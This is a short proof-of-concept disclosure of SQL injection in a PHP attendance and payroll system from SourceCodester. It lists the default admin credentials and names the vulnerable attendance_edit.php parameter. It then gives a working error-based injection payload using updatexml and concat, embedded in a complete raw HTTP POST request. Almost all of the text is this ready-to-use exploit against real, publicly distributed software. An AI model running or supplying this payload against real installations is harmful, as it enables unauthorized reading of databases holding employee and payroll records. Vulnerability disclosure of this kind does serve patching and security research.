# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\attendance_edit.php has SQL injection

Payload: id=86' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&edit_date=2022-03-21&edit_time_in=17%3A15%3A24&edit_time_out=00%3A00%3A00&edit=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159258470-5231d4fa-9cc9-494f-8540-ceb6952b957d.png)

```sql
POST /apsystem/admin/attendance_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 85
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/attendance.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=86' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&edit_date=2022-03-21&edit_time_in=17%3A15%3A24&edit_time_out=00%3A00%3A00&edit=
```
![image](https://user-images.githubusercontent.com/54017627/159258571-0e79545b-d692-4a95-b6a8-2a5d97af111b.png)

![image](https://user-images.githubusercontent.com/54017627/159258375-8d1eeaae-2257-4045-a10c-5bc0e5b6fc56.png)

